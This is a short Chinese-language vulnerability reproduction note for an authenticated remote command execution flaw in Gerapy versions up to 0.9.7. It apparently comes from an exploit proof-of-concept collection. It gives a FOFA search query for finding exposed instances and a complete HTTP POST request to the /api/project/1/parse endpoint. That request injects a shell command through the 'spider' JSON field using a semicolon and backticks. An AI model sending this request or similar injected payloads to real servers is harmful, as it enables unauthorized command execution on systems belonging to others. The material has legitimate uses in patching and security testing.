# Gerapy parse 后台远程命令执行漏洞

## 漏洞描述

Gerapy gerapy/server/core/views.py 中的方法存在任意命令执行，攻击者登录后台后发送特定的请求包即可利用漏洞

## 漏洞影响

```
Gerapy <= 0.9.7
```

## FOFA

```
title="Gerapy"
```

## 漏洞复现

登录页面

![image-20220524145144051](./images/202205241451094.png)

出现漏洞的文件为 `gerapy/server/core/views.py`

![](./images/202205241451220.png)

构造请求包测试命令执行

```
POST /api/project/1/parse HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/plain, */*
Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Content-Length: 18

{"spider":";`id`"}
```

![](./images/202205241452592.png)